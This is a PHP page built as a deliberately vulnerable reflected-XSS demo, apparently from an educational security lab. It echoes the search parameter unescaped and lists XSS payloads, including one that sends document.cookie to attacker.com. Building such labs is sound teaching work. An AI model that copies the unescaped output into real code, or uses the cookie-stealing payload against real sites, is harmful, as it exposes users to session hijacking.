<?php
/**
 * DELIBERATELY VULNERABLE SEARCH PAGE - FOR EDUCATIONAL PURPOSES
 * Demonstrates Reflected XSS vulnerability through search parameter
 */
require_once '../includes/environment.php';
?>
<!DOCTYPE html>
<html>
<head>
    <title>Search Messages (VULNERABLE)</title>
    <style>
        body { font-family: Arial; background: #f5f5f5; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; background: white; padding: 20px; border-radius: 5px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1 { color: #d32f2f; }
        .warning { background: #ffebee; border: 1px solid #d32f2f; padding: 15px; border-radius: 5px; margin-bottom: 20px; color: #c62828; }
        input[type="text"] { width: 100%; padding: 10px; margin: 10px 0; box-sizing: border-box; }
        button { background: #2e765e; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
        .result { background: #e8f5e9; padding: 15px; border-radius: 5px; margin-top: 20px; }
        code { background: #f5f5f5; padding: 2px 5px; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚠️ Message Search (VULNERABLE)</h1>
        
        <div class="warning">
            <strong>⚠️ SECURITY WARNING:</strong> This page is INTENTIONALLY VULNERABLE<br>
            • Search parameter is reflected without escaping (Reflected XSS)<br>
            • User input directly echoed in page<br>
            • NO HTML entity encoding<br>
        </div>
        
        <form method="GET">
            <label>Search:</label>
            <input type="text" name="q" placeholder="Search for...">
            <button type="submit">Search</button>
        </form>
        
        <?php if (isset($_GET['q'])): ?>
            <div class="result">
                <!-- VULNERABILITY: GET parameter reflected without escaping -->
                <h3>Search Results for: <?php echo $_GET['q']; ?></h3>
                
                <p>
                    Searching in database for: <strong><?php echo $_GET['q']; ?></strong>
                </p>
                
                <!-- Display raw GET parameter -->
                <div style="background: #fff3cd; padding: 10px; border-radius: 3px; margin-top: 10px;">
                    <strong>Debug Info (showing vulnerability):</strong><br>
                    Raw query: <?php echo $_GET['q']; ?><br>
                    Length: <?php echo strlen($_GET['q']); ?>
                </div>
            </div>
        <?php endif; ?>
        
        <div class="warning" style="margin-top: 30px;">
            <strong>Try These Reflected XSS Payloads:</strong><br><br>
            1. Simple alert:<br>
            <code>?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code><br><br>
            
            2. Image tag with onerror:<br>
            <code>?q=&lt;img src=x onerror="alert('XSS')"&gt;</code><br><br>
            
            3. SVG with onload:<br>
            <code>?q=&lt;svg/onload=alert('XSS')&gt;</code><br><br>
            
            4. Event handler:<br>
            <code>?q="&gt;&lt;body onload=alert('XSS')&gt;</code><br><br>
            
            5. Data exfiltration:<br>
            <code>?q=&lt;script&gt;fetch('http://attacker.com?cookie='+document.cookie)&lt;/script&gt;</code>
        </div>
    </div>
</body>
</html>
